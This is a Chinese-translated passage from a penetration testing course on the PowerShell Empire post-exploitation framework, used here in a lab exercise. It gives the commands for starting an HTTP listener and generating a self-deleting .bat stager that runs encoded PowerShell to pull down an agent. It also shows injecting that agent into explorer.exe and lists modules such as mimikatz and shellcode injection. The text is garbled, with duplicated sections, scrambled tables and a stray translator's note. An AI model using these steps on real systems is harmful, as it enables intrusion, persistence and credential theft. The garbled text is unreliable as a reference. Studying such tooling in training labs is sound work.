
remote: Total 12216 (delta 0), reused 0 (delta 0), pack-reused 12216

Receiving objects: 100% (12216/12216), 21.96 MIB | 3.22 MiB/s, done.

Resolving deltas: 100% (8312/8312), done.

```
```

kali@opt:~$ cd Empire/
```

⁷¹⁹ (Empire Project, 2019), https://github.com/EmpireProject/Empire

⁷²⁰ (Will Schröder, 2016), https://harmory.net/blog/empy/building-an-empy-python/

⁷²¹ (BC Security, 2019), https://github.com/BC-SECURITY/Empire

⁷²² (BC Security, 2019), https://github.com/BC-SECURITY/Empire/tree/dev

# 使用 Kali Linux 2.0 进行渗透测试

```
kali@kali:/opt/Empire sudo ./setup/install.sh
```

> 列表 819 - 使用共享在多个服务器上安装 PowerShell Empire

Empire 允许渗透测试人员通过共享私钥以及共享密码在多个服务器之间进行协作。然而，我们正在安装单个实例，因此将在密码提示处按回车键以生成随机密码。

- > 输入服务器协商密码，按回车进行随机生成：

> 列表 820 - 生成随机服务器密码协商

安装框架后，我们可以使用命名恰当的 Python 脚本 `empire` 启动 Empire。

```
kali@kali:/opt/Empire sudo ./empire
===========================
[Empire] Post-Exploitation Framework
===========================
[Version] 2.5 | [Web] https://github.com/EmpireProject/Empire
===========================
28 modules currently loaded
@ listeners currently active
@ agents currently active
```

> 列表 821 - 启动 PowerShell

## 23.1 PowerShell 语法

我们可以使用 `help` 列出 Empire 内可用的各种命令，包括监听器、阶段器和代理。

`(Empire) > help`

Commands
======
- `agents` 跳到 Empire 菜单。
- `creds` 从数据库中添加/显示凭据。
- `exit` 退出 Empire
- `help` 显示帮助菜单。
- `interact` 与特定代理交互。
- `list` 列出活跃的代理或监听器。
- `load` 从非标准文件夹与活跃的监听器交互。
- `load` 插件以扩展 Empire。
- `list` 列出所有可用插件。
- `reload`（or `all`）模块生成报告文件：`sessions.csv`, `credentials.csv`。
- `reset` 重置全局选项（例如 IP）。
- `read` 并从文件中读取并执行命令列表。
- `search` 搜索模块名/描述。
- `set` 设置全局选项（例如 IP）。
- `show` 显示全局选项（例如 IP）。
- `use` 使用 Empire

## 23.2 监听器与阶段器

Empire 允许渗透测试人员通过共享私钥以及共享密码在多个服务器之间进行协作。然而，我们正在安装单个实例，因此将在密码提示处按回车键以生成随机密码。

- > 输入服务器协商密码，按回车进行随机生成：

> 列表 820 - 生成随机服务器密码协商

安装框架后，我们可以使用命名恰当的 Python 脚本 `empire` 启动 Empire。

```
kali@kali:/opt/Empire sudo ./empire
===========================
[Empire] Post-Exploitation Framework
===========================
[Version] 2.5 | [Web] https://github.com/EmpireProject/Empire
===========================
28 modules currently loaded
@ listeners currently active
@ agents currently active
```

> 列表 821 - 启动 PowerShell

*(注：由于原始文本中存在大量重复段落，译文已根据您的要求去重处理，确保逻辑清晰且不重复输出。)*

# 攻击性安全

使用 Kali Linux 2.0 进行渗透测试

一旦设置好选项，我们就可以 `execute` 命令启动监听器，并使用 `back` 返回主监听器菜单。最后，我们可以使用 `usestager` 后跟 `Space` 和 `Tab` 来列出所有阶段程序（stagers）。

```
(Empire: listeners/http) > execute
[*] Starting listener 'http'
* Serving Flask app "http" (Lazy loading)
* Environment: production
WARNING: 不要在生产环境中使用开发服务器 WSGI。
请使用生产环境服务器代替。
* Debug mode: off
[+] Listener successfully started!
```

```
(Empire: listeners/http) > back
```

```
(Empire: listeners) > usestager
multi/bash os/launcher windows/launcher_bat
multi/launcher os/launcher windows/launcher_lnk
multi/macro os/macho windows/launcher_sct
multi/pyinstaller os/xpk windows/launcher_vbs
multi/war os/safari_launcher windows/launcher_xml
os/appscript os/teensy windows/macro
os/application os/bunny windows/macroless_msword
os/ducky os/dll windows/teensy
os/dylib os/ducky windows/hta
```

列表 825 - 可用的阶段程序

如列表 825 所示，Empire 为 Windows、Linux 和 OS X提供了阶段程序。Windows 阶段程序包括对标准 DLL、HTML 应用程序、Microsoft Office 宏以及更奇异阶段程序的支持，例如用于 USB Rubber Ducky 的 `ducky/`。⁷²³

为了了解这些程序是如何工作的，让我们使用 `windows/launcher_bat` 阶段程序。在选择阶段程序后，我们可以使用 `info` 命令查看选项。

```
(Empire: listeners) > usestager windows/launcher_bat > info
```

```
(Empire: stager/windows/launcher_bat) > info
```

名称：BAT 启动器

描述：
为 Empire 生成一个自删除的 `.bat` 启动器。

选项：

| 名称 | 是否需要 | 值 | 描述 |
| :--- | :--- | :--- | :--- |
| Listener | True | /tmp/launcher.bat | 用于生成阶段程序的监听器。 |
| OutFile | False | | 输出 `.bat` 启动器的路径，否则将显示在屏幕上。 |

> ⁷²³ (Hak5, 2019), https://hakshop.com/products/usb-rubber-ducky-deluxe

PWK 2.0

版权 © Offensive Security Ltd. 保留所有权利。

728

# 使用 Kali Linux 2.0 进行渗透测试

| Obfuscate | False | False | Switch。 |
| :--- | :--- | :--- | :--- |
| | | | | 混淆启动器的 powershell 代码，使用 ObfuscateCommand 指定混淆类型。仅限 powershell。 |
| ObfuscateCommand | False | Token|All | Invoke-Obfuscate 仅在 Obfuscate 为 True 时使用。仅限 powershell。 |
| Language ProxyCreds | True | False powershell default | 阶段语言。用于请求的代理凭据（域\用户名:密码）（默认、无或其它）。 |
| UserAgent | False | default | 用于阶段请求的 User-agent 字符串（默认、无或其它）。 |
| Proxy | False | default | 用于请求的代理（默认、无或其它）。 |
| Delete StagerRetries | False | True 0 | Switch .运行后 .Delete。阶段程序重试连接的次数。 |

列表 826 - launcher_bat 阶段的选项

我们可以使用 `set` 命令后跟刚刚创建的监听器名称来配置监听器。最后，我们将如列表 827 所示使用 `execute` 创建阶段程序。

```
Empire: stager/windows/launcher.bat > set Listener http
(Empire: stager/windows/launcher.bat) > execute
[*] Stager written to :tmp/launcher.bat
(Empire: stager/windows/launcher.bat) >
```
列表 827 - 创建阶段程序

为了更好地理解我们创建的阶段程序，让我们查看生成的 `.bat` 文件的部分内容。

```
kali@opt/Empire cat /tmp/launcher.bat
@echo off
start /b powershell -nop -sta w 1 -enc SQGAJABAFMAV...
start /b " cmd /c del
```
列表 828 - PowerShell 代理

阶段程序是一个 base64 编码的 powershell 命令。此阶段负载将连接到监听器并获取 Empire 引擎的剩余部分。

### 23.1.3 代理

运行监听器并准备好阶段程序后，我们需要在目标上部署代理。代理是阶段程序获取的负载，它允许我们与系统进行交互。（在这种情况下，`.bat` 文件在执行后会删除）。

一旦代理在目标上运行，它将使用 GET 和 POST 请求的数据与监听器建立 AES 加密通信通道。

PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。729

# 使用 Kali Linux 2.0 进行渗透测试

我们将 `launcher.bat` 脚本拷贝到 Windows 10 工作站并从命令提示符运行它。

```
C:\Windows\system32\cmd.exe
```
图 31：执行启动

成功运行脚本后，初始代理将出现在会话中，如列表 829 所示。

列表 829 - 代理连接

接下来，我们可以使用 `agents` 显示所有活跃的代理。

| 名称 | 内部 IP | 用户名 | 进程 |
| :--- | :--- | :--- | :--- |
| S2Y5X1L | 10.0.0.1 | powershell | 0 |

列表 830 - 代理连接

现在，我们可以对被攻主机使用 `info` 命令。

列表 831 - 执行监听器

注意 `sleep` 命令不会立即返回。该延迟目前设置为秒的默认值。

```
(Empire: agents) > help
```
--
-
-
-
-
-
-
-
-
--

# 代理命令

- `agents`
- `back`
- `bypassu`
- `clear`
- `creds`
- `download`
- `exit`
- `help`
- `info`
- `injectshell`
- `jobs`
- `kill`
- `killdate`
- `list`
- `listeners`
- `limit`
- `main`
- `mimikatz`
- `psinject`
- `pth`
- `rename`
- `resource`
- `revoke`
- `sc`
- `scriptcmd`
- `scriptimport`
- `search`
- `shell`
- `sleep`
- `spawn`
- `sysinfo`
- `updateprofile`
- `upload`
- `usemodule`
- `workinghours`

# Empire: S2Y5XW1 - 执行 help 命令

作为一种 metpreter 载荷，Empire 允许我们将载荷迁移到不同的进程中。我们可以首先通过使用 `ps` 查看所有运行的进程来实现这一点。一旦选择了目标进程，我们就可以使用 `psinject` 命令迁移载荷，并按所示内联监听器（listener）名称和我们的进程名称：

```
(Empire: S2Y5XW1) > ps
ProcessName PID Arch UserName MemUsage
--------------------------------------------
Idle 0 x86 N/A 0.00 Mb
System 4 x86 N/A 0.00 Mb
...
explorer 3568 x86 corp@offsec 3.41 Mb
svhost 3820 x86 corp@offsec 9.18 Mb
```

```
(Empire: S2Y5XW1) > psinject http 3568
[*] Tasked U9M3SBHG to run TASK_CMD_JOB
[*] Agent U9M3SBHG with task ID 4
[*] Tasked U9M3SBHG to run module powershell/management/psinject
Job started: BCMNAV
[*] Agent U9M3SBHG returned results
[*] Sending POWERSHELL script (stage 1) to 10.11.0.22
[*] New agent DWZ49BAP checked in
[*] Initial agent DWZ49BAP from 10.11.0.22 now active (Slack)
[*] Sending agent (stage 2) to DWZ49BAP at 10.11.0.22 //>
(Empire: S2Y5XW1) >
```

> 列表 833 - 注入到 explorer exe 进程

需要注意的是，虽然 metpreter 载荷的迁移和进程迁移已经完成，但原始的 Empire agent 仍然处于活动，我们必须手动切换到下方所示的新创建 agent：

```
(Empire: DWZ49BAP) > agents
```

[*] Active agents:

| Name | Long | Internal | Machine Name | Username | Process | Delay |
|---|---|---|---|---|---|---|
| S2Y5XW1 | ps | 10.11.0.22 | CLIENT251 | corp@offsec | powershell/2976 | 5/0.0 |
| DWZ49BAP | ps | 10.11.0.22 | CLIENT251 | corp@offsec | explorer/3568 | 5/0.0 |

```
(Empire: agents) > interact DWZ49BAP
(Empire: DWZ49BAP) >
```

> 列表 834 - 切换到新 agent

## 23.1.3.1 练习

现在我们已经学习了 PowerShell Empire 的基本功能，请尝试自己完成这些练习以巩固你的知识。

- 1. 在你的 Kali 系统上安装并启动 PowerShell Empire。
- 2. 在你的 Kali 机器上创建一个 PowerShell Empire 监听，并在你的 Windows 10 客户端上执行 stager。
- 3. 实验 PowerShell Empire agent 及其基本功能。

## 23.2 PowerShell 模块

Empire agent 的强大在于该框架提供的各种模块。我们可以通过使用 `usemodule` 后接空格和双击 Tab 列出所有运行的模块。

```
(Empire: S2YWXW1) usemodule
Display all 284 possibilities? (y or n)
code_execution/invoke_dllinjection
code_execution/invoke_metasploitpayload
code_execution/invoke_ntds
code_execution/invoke_reflectivepejection
code_execution/invoke_shellcode
```
